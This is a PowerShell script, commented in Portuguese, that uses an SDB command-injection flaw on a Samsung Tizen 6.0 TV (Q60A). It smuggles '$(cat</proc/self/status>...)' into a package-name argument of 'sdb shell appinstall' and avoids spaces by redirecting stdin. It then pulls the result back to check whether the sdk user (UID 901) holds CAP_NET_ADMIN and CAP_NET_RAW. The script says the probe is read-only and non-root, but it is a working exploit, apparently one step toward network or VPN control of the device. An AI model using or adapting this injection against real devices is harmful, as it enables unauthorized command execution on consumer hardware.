#requires -Version 5.1
<#
 Q60A / Tizen 6.0 — uma consulta nao-root das capacidades Linux do
 processo sdk (UID 901), previamente confirmado nesta TV.

 NOTA: utiliza a mesma vulnerabilidade SDB ja demonstrada. So executa
 'cat' para ler /proc/self/status e escrever um ficheiro temporario em
 /tmp. Nao altera rotas, nao abre TUN, nao chama VPN e nao faz root.
#>
[CmdletBinding()]
param([string]$Sdb='C:\tizen-studio\tools\sdb.exe')
$ErrorActionPreference='Stop'
if(-not (Test-Path -LiteralPath $Sdb -PathType Leaf)){throw "SDB nao encontrado: $Sdb"}
$deviceOutput=@(& $Sdb devices 2>&1)
$devices=@($deviceOutput | Where-Object {$_ -match '^\S+\s+device(?:\s|$)'})
if($devices.Count -ne 1){throw "E necessaria uma unica TV conectada por SDB; encontradas: $($devices.Count)"}

function Run-Sdb {
    param([string[]]$SdbArgs)
    $save=$ErrorActionPreference
    try {
        $ErrorActionPreference='Continue'
        $output=@()
        $code=-1
        try {
            $output=@(& $Sdb @SdbArgs 2>&1)
            $code=$LASTEXITCODE
        } catch {
            $output+=($_.Exception.Message)
            $code=$LASTEXITCODE
        }
        return [pscustomobject]@{Text=$output;Code=$code}
    } finally {$ErrorActionPreference=$save}
}

$randomId=[guid]::NewGuid().ToString('N').Substring(0,12)
$remote="/tmp/hugo_sdk_cap_$randomId.txt"
$local=Join-Path $env:TEMP ("hugo_sdk_cap_$randomId.txt")
# Redirecao de stdin elimina o espaco em "cat /proc/self/status".
# As aspas simples impedem avaliacao local pelo PowerShell.
$payload='0 appinstall tpk test.tpk$(cat</proc/self/status>{0}).tpk' -f $remote

Write-Host '=== LEITURA UNICA DAS CAPACIDADES SDK, SEM ROOT ==='
Write-Host '1/2: A consultar /proc/self/status do processo cat...'
$attempt=Run-Sdb -SdbArgs @('shell',$payload)
Write-Host ("SDB shell: exit="+$attempt.Code+" (closed pode ser esperado)")
Write-Host '2/2: A recuperar o ficheiro temporario via SDB pull...'
$retrieved=Run-Sdb -SdbArgs @('pull',$remote,$local)
if(-not (Test-Path -LiteralPath $local)){
    Write-Host ("INCONCLUSIVO: ficheiro nao recuperado; pull exit="+$retrieved.Code)
    @($retrieved.Text) | Select-Object -Last 4 | ForEach-Object {
        if($_ -is [System.Management.Automation.ErrorRecord]){Write-Host $_.Exception.Message}
        else{Write-Host ([string]$_)}
    }
    Write-Host 'Nao assumir falta de privilegios em sdk.'
    return
}
$data=Get-Content -LiteralPath $local -Raw
$fields=@{}
foreach($line in ($data -split "\r?\n")){
    if($line -match '^(Name|Uid|Gid|CapInh|CapPrm|CapEff|CapBnd|CapAmb|NoNewPrivs|Seccomp):\s*(.*)$'){
        $fields[$matches[1]]=$matches[2].Trim()
    }
}
if(-not $fields.ContainsKey('CapEff') -or -not $fields.ContainsKey('Uid')){
    Write-Host 'INCONCLUSIVO: campos Uid ou CapEff nao apareceram.'
    return
}
Write-Host ''
Write-Host '=== DADOS DO PROCESSO QUE EXECUTOU CAT ==='
foreach($key in @('Name','Uid','Gid','CapEff','CapPrm','CapBnd','NoNewPrivs','Seccomp')){
    if($fields.ContainsKey($key)){Write-Host ($key + ': ' + $fields[$key])}
}
$uidField=@($fields['Uid'] -split '\s+' | Where-Object {$_ -ne ''})
if($uidField.Count -lt 1 -or $uidField[0] -ne '901'){
    Write-Host 'INCONCLUSIVO: o processo nao corresponde a UID 901 sdk.'
    return
}
try{$eff=[Convert]::ToUInt64($fields['CapEff'],16)}
catch{Write-Host 'INCONCLUSIVO: CapEff nao e hexadecimal valido.';return}
$admin=($eff -band ([UInt64]1 -shl 12)) -ne [UInt64]0
$raw=($eff -band ([UInt64]1 -shl 13)) -ne [UInt64]0
Write-Host ''
Write-Host ('CAP_NET_ADMIN sdk: ' + $(if($admin){'PRESENTE'}else{'AUSENTE'}))
Write-Host ('CAP_NET_RAW sdk: ' + $(if($raw){'PRESENTE'}else{'AUSENTE'}))
Write-Host 'Esta leitura nao muda configuracoes da TV.'
Write-Host 'Nenhuma conclusao sobre acesso TUN ou VPN global e automatica.'
